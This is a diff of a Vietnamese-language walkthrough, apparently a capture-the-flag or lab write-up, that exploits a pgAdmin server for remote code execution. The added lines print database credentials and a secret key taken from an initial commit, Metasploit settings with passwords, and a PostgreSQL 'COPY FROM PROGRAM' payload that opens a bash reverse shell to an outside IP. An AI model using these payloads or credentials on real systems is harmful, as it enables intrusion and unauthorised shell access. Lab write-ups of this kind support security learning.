@@ -33,10 +33,12 @@ Rapid7
 - Kết quả: nếu thành công, attacker có thể chạy lệnh/mã trên máy chủ chạy pgAdmin (tuỳ cấu hình sẽ chạy với quyền của tiến trình pgAdmin). 
 Rapid7
 
-- Thấy được commit của admin 
+- Thử check các commit đặc biệt 
 ![alt text](image-10.png)
 
 - Lấy được passwd của database ở  Initial Commit 
+- DATABASE_URL=`postgresql://root:PsqLR00tpaSS11@172.18.0.3:5432/ps_db`
+- SECRET_KEY=`y0st528wn1idjk3b9a`
 ![alt text](image-11.png)
 
 - RCE thôi 
@@ -50,9 +52,18 @@ set PASSWORD D4LE11maan!!
 set DB_USER root
 set DB_PASS PsqLR00tpaSS11
 set DB_NAME ps_db
-set LHOST <IP>
+set LHOST 10.10.17.152
 set LPORT 4444
 exploit
 ```
 
+- Tìm hiểu về sơ đồ mạng ta thấy : `172.18.0.4`
+![alt text](image-13.png)
 
+```code
+DROP TABLE IF EXISTS cmd;
+CREATE TABLE cmd(output text);
+COPY cmd FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.17.152/4445 0>&1"';
+```
+ 
+- NFS bị misconfigured (no root_squash disabled) 
